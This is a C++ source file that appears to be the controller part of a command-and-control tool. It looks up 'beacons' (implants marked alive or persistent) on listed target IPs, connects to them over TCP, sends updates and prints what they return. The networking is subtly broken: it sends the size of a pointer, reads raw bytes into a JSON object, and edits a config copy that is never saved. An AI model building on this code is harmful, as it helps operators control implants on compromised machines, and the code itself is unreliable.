#include <iostream>
#include <string>
#include <tuple>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cmds.hpp>
#include <nlohmann/json.hpp>
#define SUCCESS 100

using json = nlohmann::json;

std::tuple<int, std::string, int> get_beacon_data(sockaddr_in &sa, int &tid){
    json config = getConfig();
    if (!config["targets"][tid]["beacon"]["alive"]){
        return {-1, "", -1};
    }
    else {
        std::string ip_addr = config["targets"][tid]["ip"];
        if (inet_pton(AF_INET, ip_addr.c_str(), &(sa.sin_addr)) <= 0){
            return {1, "", -1};
        };
        return {0, ip_addr, config["targets"][tid]["beacon"]["port"]};
    }
}

void process(json &b_response, std::string &ip, int &port){
    int id = b_response["id"];
    int status = b_response["status"];
    std::string cout = b_response["cout"];
    if (status != SUCCESS) {
        std::cerr << "error updating beacon on [" << ip << "]\n";
    }
    std::cout << "[b-" << port << "] " << cout << std::endl;
    json config = getConfig();
    config["targets"][id]["beacon"]["alive"] = b_response["alive"];
    config["targets"][id]["beacon"]["persistent"] = b_response["persistent"];
    config["targets"][id]["beacon"]["port"] = b_response["port"];
}

void communicate(int &tid, json *update) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0), valread, s_client_fd;

    if (sockfd < 0){
        std::cerr << "Error opening socket.\n";
        return;
    }
    sockaddr_in beacon_addr;
    beacon_addr.sin_family = AF_INET;
    auto [status, ip, port] = get_beacon_data(beacon_addr, tid);
    if (status < 0){
        std::cout << "a beacon may not be present on this target, or is unreachable\n";
        return;
    }
    else if(status > 0){
        std::cout << "Invalid or unsupported IP address\n";
        return;
    }
    beacon_addr.sin_port = htons(port);
    if ((s_client_fd = connect(sockfd, (struct sockaddr*)&beacon_addr, sizeof(beacon_addr))) < 0){
        std::cout << "Failed to connect to beacon on target " << tid << " [" << ip << "]\n";
        return;
    }
    send(sockfd, update, sizeof(update), 0);
    json response;
    valread = read(sockfd, &response, 16);
    process(response, ip, port);
    close(s_client_fd);
    // if (bind(sockfd, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) < 0) {
    //     std::cout << "Failed to bind to port " << port << ". errno: " << errno << std::endl;
    //     return;
    // }
}